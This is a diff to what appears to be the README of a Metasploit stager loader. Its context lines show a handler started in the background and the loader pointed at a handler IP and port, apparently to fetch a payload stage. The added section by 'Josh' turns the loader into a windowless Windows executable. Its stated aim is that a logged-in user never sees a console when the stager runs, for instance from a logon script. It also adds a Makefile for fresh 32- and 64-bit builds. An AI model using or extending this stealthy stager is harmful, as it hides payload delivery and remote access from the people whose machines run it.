@@ -34,3 +34,12 @@ msf  exploit(handler) > exploit -j
 ```
 
 loader.exe 192.168.95.241 31337
+
+Added by Josh
+-------------
+
+I made some modifications to the original loader.  Instead of compiling to a console application, which will require an open console (and will open one, if one doesn't already exist), this is now a windows executable.  The `winmain()` function processes windowing system messages, and runs the former `main()` function in the background using a thread.  
+
+This way, if you are running the stager in some fashion that has it executing in a desktop session (e.g., via a logon script), the user will not see an annoying popup.
+
+I've also added a halfway decent `Makefile`, so it's easy to mint a fresh 32- and 64-bit version of the loader as needed.
